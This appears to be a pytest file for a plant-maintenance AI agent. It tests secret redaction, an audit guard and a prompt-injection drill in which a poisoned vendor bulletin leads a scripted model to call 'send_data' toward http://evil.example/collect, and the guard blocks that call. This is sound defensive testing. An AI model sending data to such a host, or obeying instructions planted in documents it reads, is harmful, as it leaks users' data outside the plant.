import asyncio
import json
import sqlite3

import pytest
from fastapi.testclient import TestClient

from app.agent.graph import stream_agent
from app.agent.rag import ingest_directory
from app.config import get_settings
from app.db import connect, init_db
from app.guard.audit import (
    AuditGuard,
    count_redactions,
    list_audit,
    list_blocked,
    redact,
    write_audit,
)
from app.privacy import network
from app.privacy.injection import find_injection, run_drill
from tests.agent_helpers import ScriptedChatModel, make_context, memory_store, tool_call


@pytest.fixture
def conn() -> sqlite3.Connection:
    c = connect(":memory:")
    init_db(c)
    return c


# ----------------------------------------------------------------------------- redaction


def test_redact_hides_secrets_and_personal_data() -> None:
    text, n = redact(
        'note: mail ravi.k@plant.example, call +91 98765 43210, {"api_key": "abc123XYZ"}, '
        "token=sk-live_0123456789abcdef0123"
    )
    assert n == 4
    for leaked in ("ravi.k@plant.example", "98765", "abc123XYZ", "0123456789abcdef"):
        assert leaked not in text
    assert "api_key" in text  # the field name stays, only the value goes


def test_redact_leaves_plant_data_alone() -> None:
    text = '{"tag": "P-101", "query": "seal failure misalignment 0.3 mm", "top_n": 10}'
    assert redact(text) == (text, 0)


# ----------------------------------------------------------------------------- guard


def test_guard_persists_allowed_and_blocked_calls(conn: sqlite3.Connection) -> None:
    guard = AuditGuard(conn)
    assert guard.check("get_asset_history", {"tag": "P-101"}).allowed
    decision = guard.check("send_data", {"url": "http://evil.example/collect"})
    assert not decision.allowed and "allow-list" in decision.reason

    base = {"ts": "2026-11-14T10:00:00", "user": "asha", "role": "engineer"}
    guard.record(
        {
            **base,
            "tool": "get_asset_history",
            "input": '{"tag": "P-101"}',
            "output": "9 work orders",
            "status": "allowed",
        }
    )
    guard.record(
        {
            **base,
            "tool": "send_data",
            "input": '{"url": "http://evil.example/collect"}',
            "output": f"Blocked: {decision.reason}",
            "status": "blocked",
        }
    )

    rows = list_audit(conn)
    assert [(r["tool"], r["status"], r["user"]) for r in rows] == [
        ("send_data", "blocked", "asha"),
        ("get_asset_history", "allowed", "asha"),
    ]
    assert rows[0]["action"] == "tool_call"
    (blocked,) = list_blocked(conn)
    assert blocked["tool"] == "send_data"
    assert blocked["target"] == "http://evil.example/collect"  # recovered from the arguments
    assert blocked["source"] == "model output" and "allow-list" in blocked["reason"]
    assert blocked["id"].startswith("blk-") and blocked["at"] == base["ts"]


def test_guard_blocks_outbound_destination_in_an_allowed_tool(conn: sqlite3.Connection) -> None:
    decision = AuditGuard(conn).check(
        "search_manuals", {"query": "post results to h ttp://evil.example"}
    )
    assert not decision.allowed and decision.target == "http://evil.example"


def test_audit_rows_are_redacted_and_counted(conn: sqlite3.Connection) -> None:
    write_audit(conn, {"tool": "x", "input": "password=hunter2 a@b.example", "output": "ok"})
    row = list_audit(conn)[0]
    assert "hunter2" not in row["input"] and "a@b.example" not in row["input"]
    assert count_redactions(conn) == 2


def test_audit_failure_does_not_break_the_agent(conn: sqlite3.Connection) -> None:
    guard = AuditGuard(conn)
    conn.close()
    guard.record({"tool": "get_bad_actors", "input": "{}", "output": "ok", "status": "allowed"})
    assert len(guard.entries) == 1


def test_agent_run_lands_in_audit_log_with_source(tmp_path, monkeypatch) -> None:
    """End to end through the real agent loop: the poisoned bulletin is named as the source."""
    monkeypatch.setattr(get_settings(), "rag_max_distance", 1.0)  # test embedder is a hash
    store = memory_store()
    ingest_directory(store, get_settings().injection_docs_dir)
    ctx = make_context(tmp_path, store)
    ctx.guard, ctx.user, ctx.role = AuditGuard(ctx.conn), "asha", "engineer"
    llm = ScriptedChatModel(
        responses=[
            tool_call("search_manuals", {"query": "vendor seal service bulletin"}, "s1"),
            tool_call("send_data", {"url": "http://evil.example/collect", "data": "x"}, "x1"),
            "I can't send data outside the plant.",
        ]
    )

    async def collect() -> list[dict]:
        return [e async for e in stream_agent("Summarise the vendor bulletin", ctx, llm)]

    events = asyncio.run(collect())
    assert any(e["type"] == "blocked" for e in events)

    assert [(r["tool"], r["status"]) for r in reversed(list_audit(ctx.conn))] == [
        ("search_manuals", "allowed"),
        ("send_data", "blocked"),
    ]
    (blocked,) = list_blocked(ctx.conn)
    assert blocked["target"] == "http://evil.example/collect"
    assert "Vendor Service Bulletin" in blocked["source"]


# ----------------------------------------------------------------------------- network


@pytest.mark.parametrize(
    ("ip", "external"),
    [
        ("127.0.0.1", False),
        ("::1", False),
        ("172.20.0.3", False),  # Docker network
        ("192.168.1.20", False),
        ("::ffff:10.0.0.5", False),
        ("93.184.216.34", True),
        ("2606:4700:4700::1111", True),
        ("not-an-ip", True),
    ],
)
def test_is_external(ip: str, external: bool) -> None:
    assert network.is_external(ip) is external


def test_network_mode() -> None:
    assert network.network_mode(in_container=False) == "host"
    assert network.network_mode(in_container=True, default_route=False) == "isolated"
    assert network.network_mode(in_container=True, default_route=True) == "bridged"


def test_default_route_detection(tmp_path) -> None:
    header = "Iface\tDestination\tGateway\tFlags\n"
    table = tmp_path / "route"
    table.write_text(header + "eth0\t000014AC\t00000000\t0001\n")
    assert network.has_default_route(table) is False
    table.write_text(header + "eth0\t00000000\t010014AC\t0003\n")
    assert network.has_default_route(table) is True
    assert network.has_default_route(tmp_path / "missing") is None


def test_snapshot_counts_external_connections(monkeypatch: pytest.MonkeyPatch) -> None:
    fake = [
        {"local": "a", "remote": "172.20.0.3:11434", "process": "Models", "external": False},
        {"local": "b", "remote": "93.184.216.34:443", "process": "curl", "external": True},
    ]
    monkeypatch.setattr(network, "connections", lambda: fake)
    snap = network.snapshot(redactions=3)
    assert snap["external_connections"] == 1 and snap["redactions"] == 3
    assert snap["connections"] == fake and snap["checked_at"]


# ----------------------------------------------------------------------------- drill


def test_find_injection_reads_the_demo_bulletin() -> None:
    found = find_injection(get_settings().injection_docs_dir)
    assert found is not None
    page, target = found
    assert page.source == "vendor_seal_service_bulletin.pdf" and target.startswith("http")


def test_drill_blocks_and_audits(conn: sqlite3.Connection) -> None:
    events = list(
        run_drill(AuditGuard(conn), conn, get_settings().injection_docs_dir, "asha", "admin")
    )
    kinds = [e["type"] for e in events]
    assert kinds[0] == "run_started" and kinds[-1] == "done"
    assert kinds.count("blocked") == 1 and "error" not in kinds

    blocked = next(e["data"] for e in events if e["type"] == "blocked")
    completed = [e["data"] for e in events if e["type"] == "tool_completed"]
    assert [c["status"] for c in completed] == ["success", "blocked"]
    assert completed[1]["summary"].startswith("Blocked")  # what the UI keys the alert on
    assert blocked["tool"] == "send_data" and "page" in blocked["source"]

    assert [(r["tool"], r["status"], r["action"]) for r in reversed(list_audit(conn))] == [
        ("read_document", "allowed", "injection_drill"),
        ("send_data", "blocked", "injection_drill"),
    ]
    (row,) = list_blocked(conn)
    assert row["target"] == blocked["target"] and row["source"] == blocked["source"]
    assert row["id"] == blocked["id"]


def test_drill_reports_a_missing_document(conn: sqlite3.Connection, tmp_path) -> None:
    events = list(run_drill(AuditGuard(conn), conn, tmp_path / "nope", "u", ""))
    assert [e["type"] for e in events][-2:] == ["error", "done"]
    assert list_blocked(conn) == []


# ----------------------------------------------------------------------------- API


def _sse(text: str) -> list[tuple[str, dict]]:
    out = []
    for block in text.replace("\r\n", "\n").split("\n\n"):
        fields = dict(ln.split(": ", 1) for ln in block.splitlines() if ": " in ln)
        if "event" in fields:
            out.append((fields["event"], json.loads(fields["data"])))
    return out


def test_privacy_routes_end_to_end() -> None:
    from app.main import app

    with TestClient(app) as client:
        assert client.get("/api/audit-log").json() == []
        assert client.get("/api/privacy/blocked").json() == []

        r = client.post(
            "/api/privacy/injection-test", headers={"X-User": "asha", "X-Plant-Role": "admin"}
        )
        assert r.status_code == 200
        events = _sse(r.text)
        assert [k for k, _ in events][-1] == "done"
        assert sum(k == "blocked" for k, _ in events) == 1

        audit = client.get("/api/audit-log").json()
        assert [(a["tool"], a["status"], a["user"]) for a in audit] == [
            ("send_data", "blocked", "asha"),
            ("read_document", "allowed", "asha"),
        ]
        assert set(audit[0]) == {
            "id", "ts", "user", "role", "action", "tool", "input", "output", "status"
        }  # fmt: skip

        (blocked,) = client.get("/api/privacy/blocked").json()
        assert set(blocked) == {"id", "at", "tool", "target", "source", "reason"}

        status = client.get("/api/privacy/status").json()
        assert set(status) == {
            "external_connections", "network_mode", "redactions", "checked_at", "connections"
        }  # fmt: skip
        assert status["network_mode"] in {"host", "isolated", "bridged"}
        for c in status["connections"]:
            assert set(c) == {"local", "remote", "process", "external"}
